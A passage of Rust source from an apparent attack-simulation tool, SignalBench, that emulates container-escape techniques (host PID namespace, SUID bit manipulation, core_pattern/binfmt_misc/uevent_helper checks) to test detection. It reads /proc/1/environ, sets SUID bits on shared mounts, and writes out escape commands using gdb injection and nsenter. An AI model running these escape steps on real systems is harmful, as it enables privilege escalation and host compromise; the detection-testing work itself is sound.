                        .output()
                        .await;
                    
                    if let Ok(output) = verify_output {
                        if output.status.success() {
                            let content = String::from_utf8_lossy(&output.stdout);
                            findings.push(format!("[VERIFIED] Host marker content: {}", content.trim()));
                            debug!("[T1611-PIDNS] Marker file verified on host");
                        }
                    }
                }
                
                // 11. cat /proc/1/environ - Read PID 1 environment
                info!("[T1611-PIDNS] Executing: cat /proc/1/environ");
                let environ_output = Command::new("cat")
                    .args(["/proc/1/environ"])
                    .output()
                    .await;
                
                match environ_output {
                    Ok(output) => {
                        if output.status.success() {
                            let env_count = output.stdout.split(|&b| b == 0).count();
                            findings.push(format!("[CRITICAL] cat /proc/1/environ - SUCCESS ({} vars)", env_count));
                            findings.push("[WARNING] Can read host init environment variables!".to_string());
                        } else {
                            findings.push("[EXEC] cat /proc/1/environ - BLOCKED".to_string());
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] cat /proc/1/environ - ERROR: {}", e));
                    }
                }
            }
            
            // Detect --pid=host by examining /proc
            let mut host_pidns = false;
            let mut host_processes = Vec::new();
            
            debug!("[T1611-PIDNS] Enumerating /proc for PID namespace detection");
            
            if let Ok(entries) = fs::read_dir("/proc") {
                for entry in entries.flatten() {
                    let name = entry.file_name();
                    let name_str = name.to_string_lossy();
                    
                    // Check if it's a PID directory
                    if name_str.chars().all(|c| c.is_ascii_digit()) {
                        // Read process name
                        let comm_path = format!("/proc/{}/comm", name_str);
                        if let Ok(comm) = fs::read_to_string(&comm_path) {
                            let comm = comm.trim();
                            
                            // Host-only processes indicate shared PID namespace
                            let host_indicators = [
                                "systemd", "init", "kthreadd", "dockerd", "containerd",
                                "sshd", "cron", "rsyslogd", "journald", "udevd",
                                "NetworkManager", "polkitd", "dbus-daemon",
                            ];
                            
                            for indicator in &host_indicators {
                                if comm.contains(indicator) {
                                    host_pidns = true;
                                    host_processes.push(format!("{}: {}", name_str, comm));
                                    debug!("[T1611-PIDNS] Found host process: {} ({})", comm, name_str);
                                }
                            }
                        }
                    }
                }
            }
            
            if host_pidns {
                findings.push("[CRITICAL] Host PID namespace detected (--pid=host)".to_string());
                findings.push(format!("[INFO] {} host-specific processes visible", host_processes.len()));
                info!("[T1611-PIDNS] [CRITICAL] Host PID namespace sharing detected");
                
                // List some host processes
                for proc in host_processes.iter().take(10) {
                    findings.push(format!("  Host process: {}", proc));
                }
            } else {
                findings.push("[SAFE] Limited process visibility - appears to be isolated PID namespace".to_string());
            }
            
            // Check for ptrace tools
            let ptrace_tools = [
                ("/usr/bin/gdb", "gdb - GNU Debugger"),
                ("/usr/bin/strace", "strace - System call tracer"),
                ("/usr/bin/ltrace", "ltrace - Library call tracer"),
                ("/usr/bin/ptrace", "ptrace utility"),
            ];
            
            for (path, desc) in &ptrace_tools {
                if Path::new(path).exists() {
                    findings.push(format!("[INFO] Ptrace tool available: {}", desc));
                    debug!("[T1611-PIDNS] Found ptrace tool: {}", path);
                }
            }
            
            // Generate escape simulation commands
            if has_sys_ptrace && host_pidns {
                let escape_file = format!("{}/ptrace_escape_commands.txt", output_dir);
                if let Ok(mut f) = File::create(&escape_file) {
                    let commands = r#"# SignalBench T1611-PIDNS - Host PID Namespace Escape Commands
# These commands demonstrate the escape technique - NOT for malicious use

# 1. Find a target host process
ps aux | grep -E "(sshd|cron|dockerd)"

# 2. Attach to the process with gdb (requires CAP_SYS_PTRACE)
# gdb -p <HOST_PID>

# 3. Inject shellcode or execute commands
# (gdb) call system("/bin/bash -c 'id > /tmp/pwned'")

# 4. Alternative: Use process_vm_writev for direct memory injection
# Requires writing custom injector code

# 5. Using nsenter to enter host namespaces (if available)
# nsenter -t 1 -m -u -i -n -p /bin/bash

# Real attacker would:
# - Inject reverse shell into a host process
# - Modify process memory to escalate privileges
# - Install persistence mechanisms on the host
"#;
                    let _ = f.write_all(commands.as_bytes());
                    artefacts.push(escape_file);
                    findings.push("[INFO] Escape simulation commands written".to_string());
                }
            }
            
            // Check PID namespace of current process vs PID 1
            if let Ok(self_pidns) = fs::read_link("/proc/self/ns/pid") {
                if let Ok(init_pidns) = fs::read_link("/proc/1/ns/pid") {
                    debug!("[T1611-PIDNS] Self PID ns: {:?}, Init PID ns: {:?}", self_pidns, init_pidns);
                    if self_pidns == init_pidns {
                        findings.push("[CRITICAL] PID namespace matches host (proc/1)".to_string());
                        host_pidns = true;
                    } else {
                        findings.push("[INFO] PID namespace differs from host".to_string());
                    }
                }
            }
            
            // Write process list if shared namespace
            if enumerate_processes && host_pidns {
                let ps_output = Command::new("ps")
                    .args(["auxww"])
                    .output()
                    .await;
                
                if let Ok(output) = ps_output {
                    if output.status.success() {
                        let ps_file = format!("{}/process_list.txt", output_dir);
                        if let Ok(mut f) = File::create(&ps_file) {
                            let _ = f.write_all(&output.stdout);
                            artefacts.push(ps_file);
                        }
                    }
                }
            }
            
            // Write findings report
            let report_file = format!("{}/pidns_escape_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let container_env = detect_container_environment_with_prefix("T1611-PIDNS");
                let report = format!(
                    "SignalBench T1611-PIDNS - Host PID Namespace Escape Report\n{}\n\nContainer Environment:\n  Is Container: {}\n  Runtime: {:?}\n\nCapabilities:\n  CAP_SYS_PTRACE: {}\n  CAP_SYS_ADMIN: {}\n\nPID Namespace:\n  Host PID namespace shared: {}\n  Host processes found: {}\n\nFindings:\n{}\n",
                    "=".repeat(60),
                    container_env.is_container,
                    container_env.runtime,
                    has_sys_ptrace,
                    has_sys_admin,
                    host_pidns,
                    host_processes.len(),
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_possible = has_sys_ptrace && host_pidns;
            let message = if escape_possible {
                format!("Host PID namespace escape possible - CAP_SYS_PTRACE + --pid=host detected with {} host processes visible", host_processes.len())
            } else if host_pidns {
                "Host PID namespace shared but CAP_SYS_PTRACE not available - limited escape potential".to_string()
            } else {
                "Host PID namespace escape not feasible - isolated PID namespace".to_string()
            };
            
            info!("[T1611-PIDNS] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-PIDNS] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                // Special handling for host marker files created via nsenter
                if artefact == "/tmp/signalbench_pidns_escape_marker" {
                    debug!("[T1611-PIDNS] Removing host marker file via nsenter");
                    // Remove the marker file via nsenter into host namespace
                    let cleanup_result = Command::new("nsenter")
                        .args(["--target", "1", "--all", "--", "rm", "-f", artefact])
                        .output()
                        .await;
                    
                    match cleanup_result {
                        Ok(output) => {
                            if output.status.success() {
                                info!("[T1611-PIDNS] Removed host marker file: {}", artefact);
                            } else {
                                // Fallback: try local removal (if running on host)
                                if let Err(e) = fs::remove_file(artefact) {
                                    warn!("[T1611-PIDNS] Failed to remove host marker {}: {}", artefact, e);
                                }
                            }
                        }
                        Err(_) => {
                            // Fallback: try local removal
                            if let Err(e) = fs::remove_file(artefact) {
                                debug!("[T1611-PIDNS] Could not remove host marker {}: {}", artefact, e);
                            }
                        }
                    }
                    continue;
                }
                
                let path = Path::new(artefact);
                if path.is_dir() {
                    debug!("[T1611-PIDNS] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-PIDNS] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-PIDNS] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-PIDNS] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-PIDNS] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-SUID: SUID Privilege Escalation Escape
// =============================================================================

/// SUID privilege escalation escape technique based on Unit42 research.
/// Creates executable files and sets SUID bit via chmod u+s to enable
/// privilege escalation from container to host when directories are shared.
pub struct SuidPrivilegeEscape {}

#[async_trait]
impl AttackTechnique for SuidPrivilegeEscape {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-SUID".to_string(),
            name: "SUID Privilege Escalation Escape".to_string(),
            description: "Container escape via SUID bit manipulation on shared directories. Executes chmod u+s on binaries in /tmp and shared mount points to enable privilege escalation. When a container runs as root in the same user namespace as the host, SUID bits set inside the container persist outside. Based on Unit42 container breakout research.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for SUID escape artefacts".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_suid_escape".to_string()),
                },
                TechniqueParameter {
                    name: "test_shared_dirs".to_string(),
                    description: "Test SUID on potential shared directories".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: chmod u+s or chmod 4755 commands from containers, SUID bit changes on files in shared directories, execution of SUID binaries by non-root users, file creation followed by chmod in /tmp or mounted volumes.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_suid_escape".to_string());
            
            let test_shared_dirs = config
                .parameters
                .get("test_shared_dirs")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-SUID] Starting SUID Privilege Escalation Escape technique");
            debug!("[T1611-SUID] Output directory: {}", output_dir);
            debug!("[T1611-SUID] Test shared directories: {}", test_shared_dirs);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            
            // Detect container environment
            let container_env = detect_container_environment_with_prefix("T1611-SUID");
            debug!("[T1611-SUID] Container detection: is_container={}, runtime={:?}",
                   container_env.is_container, container_env.runtime);
            
            if dry_run {
                info!("[DRY RUN] Would perform SUID Privilege Escalation Escape:");
                info!("[DRY RUN] - Check user namespace configuration");
                info!("[DRY RUN] - Execute: id (check if running as root)");
                info!("[DRY RUN] - Create test binary: {}/signalbench_suid_test", output_dir);
                info!("[DRY RUN] - Execute: chmod u+s {}/signalbench_suid_test", output_dir);
                info!("[DRY RUN] - Execute: chmod 4755 {}/signalbench_suid_test", output_dir);
                info!("[DRY RUN] - Execute: ls -la to verify SUID bit");
                info!("[DRY RUN] - Test on shared mount directories");
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform SUID privilege escalation escape".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-SUID] Creating output directory: {}", output_dir);
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-SUID] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // =========================================================
            // Check prerequisites for SUID escape
            // =========================================================
            
            // 1. Check if running as root
            info!("[T1611-SUID] Executing: id");
            let id_output = Command::new("id")
                .output()
                .await;
            
            let mut is_root = false;
            match id_output {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    findings.push(format!("[EXEC] id - {}", stdout.trim()));
                    debug!("[T1611-SUID] id output: {}", stdout.trim());
                    
                    if stdout.contains("uid=0") || stdout.contains("(root)") {
                        is_root = true;
                        findings.push("[CRITICAL] Running as root - SUID escape possible".to_string());
                        info!("[T1611-SUID] Running as root - SUID bit manipulation possible");
                    } else {
                        findings.push("[INFO] Not running as root - SUID escape limited".to_string());
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] id - ERROR: {}", e));
                }
            }
            
            // 2. Check user namespace configuration
            info!("[T1611-SUID] Checking user namespace configuration");
            let self_userns = fs::read_link("/proc/self/ns/user");
            let init_userns = fs::read_link("/proc/1/ns/user");
            
            let mut same_userns = false;
            match (self_userns, init_userns) {
                (Ok(self_ns), Ok(init_ns)) => {
                    debug!("[T1611-SUID] Self user ns: {:?}, Init user ns: {:?}", self_ns, init_ns);
                    if self_ns == init_ns {
                        same_userns = true;
                        findings.push("[CRITICAL] Same user namespace as host - SUID bits persist outside container".to_string());
                        info!("[T1611-SUID] Same user namespace as host detected");
                    } else {
                        findings.push("[INFO] Different user namespace - SUID bits may not persist on host".to_string());
                    }
                }
                _ => {
                    findings.push("[INFO] Could not determine user namespace configuration".to_string());
                }
            }
            
            // =========================================================
            // Create and manipulate SUID binaries
            // =========================================================
            
            // 3. Create a test SUID binary (simple shell wrapper)
            let suid_binary_path = format!("{}/signalbench_suid_test", output_dir);
            let suid_script_content = r#"#!/bin/sh
# SignalBench T1611-SUID test binary
# This script demonstrates SUID privilege escalation
echo "SignalBench SUID test - running as: $(id)"
echo "Effective UID: $(id -u)"
echo "Real UID: $(id -ru)"
"#;
            
            info!("[T1611-SUID] Creating SUID test binary: {}", suid_binary_path);
            debug!("[T1611-SUID] Writing SUID test script content");
            
            match fs::write(&suid_binary_path, suid_script_content) {
                Ok(_) => {
                    findings.push(format!("[EXEC] Created test binary: {}", suid_binary_path));
                    artefacts.push(suid_binary_path.clone());
                    
                    // Make it executable first
                    info!("[T1611-SUID] Executing: chmod +x {}", suid_binary_path);
                    let chmod_x = Command::new("chmod")
                        .args(["+x", &suid_binary_path])
                        .output()
                        .await;
                    
                    if let Ok(output) = chmod_x {
                        if output.status.success() {
                            debug!("[T1611-SUID] Made binary executable");
                        }
                    }
                    
                    // 4. Set SUID bit using chmod u+s (Unit42 method)
                    info!("[T1611-SUID] Executing: chmod u+s {}", suid_binary_path);
                    let chmod_suid = Command::new("chmod")
                        .args(["u+s", &suid_binary_path])
                        .output()
                        .await;
                    
                    match chmod_suid {
                        Ok(output) => {
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            if output.status.success() {
                                findings.push("[CRITICAL] chmod u+s - SUCCESS (SUID bit set!)".to_string());
                                info!("[T1611-SUID] [CRITICAL] SUID bit set successfully via chmod u+s");
                            } else {
                                findings.push(format!("[EXEC] chmod u+s - FAILED: {}", stderr.trim()));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] chmod u+s - ERROR: {}", e));
                        }
                    }
                    
                    // 5. Also try chmod 4755 (alternative SUID method)
                    let suid_binary_path_alt = format!("{}/signalbench_suid_test_4755", output_dir);
                    if fs::write(&suid_binary_path_alt, suid_script_content).is_ok() {
                        artefacts.push(suid_binary_path_alt.clone());
                        
                        info!("[T1611-SUID] Executing: chmod 4755 {}", suid_binary_path_alt);
                        let chmod_4755 = Command::new("chmod")
                            .args(["4755", &suid_binary_path_alt])
                            .output()
                            .await;
                        
                        match chmod_4755 {
                            Ok(output) => {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                if output.status.success() {
                                    findings.push("[CRITICAL] chmod 4755 - SUCCESS (SUID bit set!)".to_string());
                                    info!("[T1611-SUID] [CRITICAL] SUID bit set successfully via chmod 4755");
                                } else {
                                    findings.push(format!("[EXEC] chmod 4755 - FAILED: {}", stderr.trim()));
                                }
                            }
                            Err(e) => {
                                findings.push(format!("[EXEC] chmod 4755 - ERROR: {}", e));
                            }
                        }
                    }
                    
                    // 6. Verify SUID bit with ls -la
                    info!("[T1611-SUID] Executing: ls -la {}", output_dir);
                    let ls_output = Command::new("ls")
                        .args(["-la", &output_dir])
                        .output()
                        .await;
                    
                    match ls_output {
                        Ok(output) => {
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            findings.push("[EXEC] ls -la - Verifying SUID bits:".to_string());
                            for line in stdout.lines() {
                                if line.contains("signalbench_suid") {
                                    findings.push(format!("  {}", line));
                                    debug!("[T1611-SUID] File listing: {}", line);
                                    
                                    // Check if SUID bit is visible (s in permissions)
                                    if line.contains("rws") || line.contains("rwS") {
                                        findings.push("[VERIFIED] SUID bit confirmed in file permissions".to_string());
                                        info!("[T1611-SUID] SUID bit verified in file listing");
                                    }
                                }
                            }
                            
                            // Save full listing
                            let ls_file = format!("{}/ls_output.txt", output_dir);
                            if let Ok(mut f) = File::create(&ls_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(ls_file);
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] ls -la - ERROR: {}", e));
                        }
                    }
                    
                    // 7. Use stat to show detailed permissions
                    info!("[T1611-SUID] Executing: stat {}", suid_binary_path);
                    let stat_output = Command::new("stat")
                        .args([&suid_binary_path])
                        .output()
                        .await;
                    
                    if let Ok(output) = stat_output {
                        if output.status.success() {
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            findings.push(format!("[EXEC] stat - {}", stdout.lines().next().unwrap_or("")));
                            debug!("[T1611-SUID] stat output: {}", stdout);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] Failed to create test binary: {}", e));
                    warn!("[T1611-SUID] Could not create test binary: {}", e);
                }
            }
            
            // =========================================================
            // Test on shared mount directories
            // =========================================================
            
            if test_shared_dirs && is_root {
                debug!("[T1611-SUID] Testing SUID on potential shared directories");
                
                // Enumerate mounts to find potential shared directories
                let mounts = enumerate_mounts_with_prefix("T1611-SUID");
                
                // Look for bind mounts or host directories
                let shared_candidates: Vec<&MountInfo> = mounts.iter()
                    .filter(|m| {
                        // Look for potential shared directories
                        m.target.starts_with("/mnt") ||
                        m.target.starts_with("/host") ||
                        m.target.starts_with("/shared") ||
                        m.target.starts_with("/data") ||
                        (m.source.starts_with("/") && !m.source.starts_with("/dev"))
                    })
                    .collect();
                
                for mount in shared_candidates.iter().take(3) {
                    let test_path = format!("{}/signalbench_suid_shared_test", mount.target);
                    info!("[T1611-SUID] Testing SUID on shared mount: {}", mount.target);
                    debug!("[T1611-SUID] Creating test file at: {}", test_path);
                    
                    // Try to create and chmod in shared directory
                    if fs::write(&test_path, suid_script_content).is_ok() {
                        artefacts.push(test_path.clone());
                        
                        let _ = Command::new("chmod").args(["+x", &test_path]).output().await;
                        
                        info!("[T1611-SUID] Executing: chmod u+s {}", test_path);
                        let chmod_shared = Command::new("chmod")
                            .args(["u+s", &test_path])
                            .output()
                            .await;
                        
                        if let Ok(output) = chmod_shared {
                            if output.status.success() {
                                findings.push(format!("[CRITICAL] chmod u+s on shared mount {} - SUCCESS", mount.target));
                                findings.push("[ESCAPE] SUID binary created in shared directory - host escape possible!".to_string());
                                info!("[T1611-SUID] [ESCAPE] SUID binary in shared mount: {}", test_path);
                            } else {
                                findings.push(format!("[EXEC] chmod u+s on {} - BLOCKED", mount.target));
                            }
                        }
                    } else {
                        findings.push(format!("[INFO] Cannot write to shared mount: {}", mount.target));
                    }
                }
            }
            
            // =========================================================
            // Additional SUID discovery and manipulation
            // =========================================================
            
            // 8. Find existing SUID binaries that could be abused
            info!("[T1611-SUID] Executing: find /usr -perm -4000 2>/dev/null | head -20");
            let find_suid = Command::new("bash")
                .args(["-c", "find /usr /bin /sbin -perm -4000 2>/dev/null | head -20"])
                .output()
                .await;
            
            if let Ok(output) = find_suid {
                if output.status.success() {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let suid_count = stdout.lines().count();
                    findings.push(format!("[INFO] Found {} existing SUID binaries", suid_count));
                    
                    // Log potentially dangerous SUID binaries
                    let dangerous = ["nmap", "vim", "find", "awk", "perl", "python", "ruby", "php", "node"];
                    for line in stdout.lines() {
                        for d in &dangerous {
                            if line.contains(d) {
                                findings.push(format!("[WARNING] Potentially exploitable SUID: {}", line));
                                debug!("[T1611-SUID] Dangerous SUID binary: {}", line);
                            }
                        }
                    }
                    
                    let suid_list_file = format!("{}/existing_suid_binaries.txt", output_dir);
                    if let Ok(mut f) = File::create(&suid_list_file) {
                        let _ = f.write_all(output.stdout.as_slice());
                        artefacts.push(suid_list_file);
                    }
                }
            }
            
            // 9. Check for SGID binaries too
            info!("[T1611-SUID] Executing: find /usr -perm -2000 2>/dev/null | head -10");
            let find_sgid = Command::new("bash")
                .args(["-c", "find /usr /bin -perm -2000 2>/dev/null | head -10"])
                .output()
                .await;
            
            if let Ok(output) = find_sgid {
                if output.status.success() {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let sgid_count = stdout.lines().count();
                    if sgid_count > 0 {
                        findings.push(format!("[INFO] Found {} SGID binaries", sgid_count));
                    }
                }
            }
            
            // 10. Check mount options for nosuid
            info!("[T1611-SUID] Checking mount options for nosuid restrictions");
            for mount in enumerate_mounts_with_prefix("T1611-SUID").iter() {
                if mount.options.contains("nosuid") {
                    findings.push(format!("[SAFE] Mount {} has nosuid - SUID escape blocked", mount.target));
                    debug!("[T1611-SUID] nosuid mount: {}", mount.target);
                } else if mount.target == "/tmp" || mount.target.starts_with("/mnt") {
                    findings.push(format!("[WARNING] Mount {} allows SUID - potential escape vector", mount.target));
                }
            }
            
            // Write findings report
            let report_file = format!("{}/suid_escape_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let report = format!(
                    "SignalBench T1611-SUID - SUID Privilege Escalation Escape Report\n{}\n\nContainer Environment:\n  Is Container: {}\n  Runtime: {:?}\n\nPrerequisites:\n  Running as root: {}\n  Same user namespace as host: {}\n\nFindings:\n{}\n",
                    "=".repeat(60),
                    container_env.is_container,
                    container_env.runtime,
                    is_root,
                    same_userns,
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_possible = is_root && same_userns;
            let message = if escape_possible {
                "SUID privilege escalation escape possible - root in same user namespace as host".to_string()
            } else if is_root {
                "Running as root but different user namespace - SUID persistence on host uncertain".to_string()
            } else {
                "SUID escape not feasible - not running as root".to_string()
            };
            
            info!("[T1611-SUID] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-SUID] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                let path = Path::new(artefact);
                
                // Remove SUID bit before deletion for safety
                if path.is_file() && artefact.contains("signalbench_suid") {
                    debug!("[T1611-SUID] Removing SUID bit from: {}", artefact);
                    let _ = Command::new("chmod")
                        .args(["u-s", artefact])
                        .output()
                        .await;
                }
                
                if path.is_dir() {
                    debug!("[T1611-SUID] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-SUID] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-SUID] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-SUID] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-SUID] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-BREAKOUT: Advanced Container Breakout Vectors
// =============================================================================
// Implements additional breakout techniques from LinPEAS and deepce:
// - core_pattern: /proc/sys/kernel/core_pattern userspace handler hijacking
// - binfmt_misc: Binary format handler exploitation
// - uevent_helper: Kernel uevent helper exploitation
// - release_agent improvements with better detection

pub struct AdvancedContainerBreakout {}

#[async_trait]
impl AttackTechnique for AdvancedContainerBreakout {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-BREAKOUT".to_string(),
            name: "Advanced Container Breakout Vectors".to_string(),
            description: "READ-ONLY container breakout analysis testing multiple kernel \
                escape vectors from LinPEAS and deepce. Reads and analyses core_pattern \
                configuration (/proc/sys/kernel/core_pattern), binfmt_misc handler status \
                (/proc/sys/fs/binfmt_misc), uevent_helper settings (/sys/kernel/uevent_helper), \
                and kernel modprobe/hotplug paths. Uses permission checks via stat() to detect \
                writability without modification. Safe for security assessment - no system \
                changes made.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for output files".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_breakout".to_string()),
                },
                TechniqueParameter {
                    name: "test_core_pattern".to_string(),
                    description: "Analyse core_pattern configuration".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "test_binfmt".to_string(),
                    description: "Analyse binfmt_misc handlers".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "test_uevent".to_string(),
                    description: "Analyse uevent_helper settings".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: reads of /proc/sys/kernel/core_pattern, access to \
                /proc/sys/fs/binfmt_misc directory listing, reads of /sys/kernel/uevent_helper, \
                CAP_SYS_ADMIN capability checks, sysctl queries for kernel parameters, \
                stat() calls on kernel tunable paths.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_breakout".to_string());
            
            let test_core_pattern = config
                .parameters
                .get("test_core_pattern")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            let test_binfmt = config
                .parameters
                .get("test_binfmt")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            let test_uevent = config
                .parameters
                .get("test_uevent")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-BREAKOUT] Starting Advanced Container Breakout technique");
            debug!("[T1611-BREAKOUT] Output directory: {}", output_dir);
            debug!("[T1611-BREAKOUT] Tests: core_pattern={}, binfmt={}, uevent={}", 
                   test_core_pattern, test_binfmt, test_uevent);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            
            // Detect container environment
            let container_env = detect_container_environment_with_prefix("T1611-BREAKOUT");
            debug!("[T1611-BREAKOUT] Container: is_container={}, runtime={:?}",
                   container_env.is_container, container_env.runtime);
            
            // Parse capabilities
            let caps = parse_capabilities_with_prefix("T1611-BREAKOUT");
            let has_sys_admin = has_capability(&caps, CAP_SYS_ADMIN);
            debug!("[T1611-BREAKOUT] CAP_SYS_ADMIN: {}", has_sys_admin);
            
            // Check if root
            let is_root = unsafe { libc::geteuid() } == 0;
            debug!("[T1611-BREAKOUT] Running as root: {}", is_root);
            
            if dry_run {
                info!("[DRY RUN] Would perform Advanced Container Breakout:");
                info!("[DRY RUN] - Check for CAP_SYS_ADMIN capability");
                if test_core_pattern {
                    info!("[DRY RUN] - Read and analyse /proc/sys/kernel/core_pattern");
                    info!("[DRY RUN] - Attempt to write malicious core handler");
                }
                if test_binfmt {
                    info!("[DRY RUN] - Enumerate /proc/sys/fs/binfmt_misc");
                    info!("[DRY RUN] - Attempt to register malicious binary handler");
                }
                if test_uevent {
                    info!("[DRY RUN] - Read /sys/kernel/uevent_helper");
                    info!("[DRY RUN] - Attempt to hijack uevent handler");
                }
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform advanced container breakout tests".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-BREAKOUT] Creating output directory: {}", output_dir);
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-BREAKOUT] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            findings.push(format!("[INFO] Container detected: {}", container_env.is_container));
            findings.push(format!("[INFO] Container runtime: {:?}", container_env.runtime));
            findings.push(format!("[INFO] Running as root: {}", is_root));
            findings.push(format!("[INFO] CAP_SYS_ADMIN: {}", has_sys_admin));
            
            // =========================================================
            // 1. Core Pattern Analysis (READ-ONLY)
            // =========================================================
            if test_core_pattern {
                info!("[T1611-BREAKOUT] Analysing core_pattern escape vector (read-only)");
                
                // Read current core_pattern
                let core_pattern_path = "/proc/sys/kernel/core_pattern";
                info!("[T1611-BREAKOUT] Reading: {}", core_pattern_path);
                
                match fs::read_to_string(core_pattern_path) {
                    Ok(current) => {
                        let current = current.trim();
                        findings.push(format!("[INFO] Current core_pattern: {}", current));
                        debug!("[T1611-BREAKOUT] Current core_pattern: {}", current);
                        
                        // Check if it starts with | (userspace handler)
                        if current.starts_with('|') {
                            findings.push("[WARNING] core_pattern uses userspace handler - potentially exploitable".to_string());
                        } else if current.contains('/') {
                            findings.push("[INFO] core_pattern uses file path - core dumps written to filesystem".to_string());
                        }
                        
                        // Check write permissions via stat (read-only check)
                        let metadata = fs::metadata(core_pattern_path);
                        match metadata {
                            Ok(m) => {
                                use std::os::unix::fs::PermissionsExt;
                                let mode = m.permissions().mode();
                                let writable = (mode & 0o222) != 0;
                                findings.push(format!("[INFO] core_pattern permissions: {:o} (writable: {})", mode & 0o777, writable));
                                
                                if writable && is_root {
                                    findings.push("[VULN] core_pattern appears writable with current privileges".to_string());
                                }
                            }
                            Err(e) => {
                                findings.push(format!("[INFO] Cannot stat core_pattern: {}", e));
                            }
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[INFO] core_pattern read - inaccessible: {}", e));
                    }
                }
                
                // Read via sysctl command (read-only)
                info!("[T1611-BREAKOUT] Executing: sysctl kernel.core_pattern");
                let sysctl_output = Command::new("sysctl")
                    .args(["kernel.core_pattern"])
                    .output()
                    .await;
                
                if let Ok(output) = sysctl_output {
                    if output.status.success() {
                        let stdout = String::from_utf8_lossy(&output.stdout);
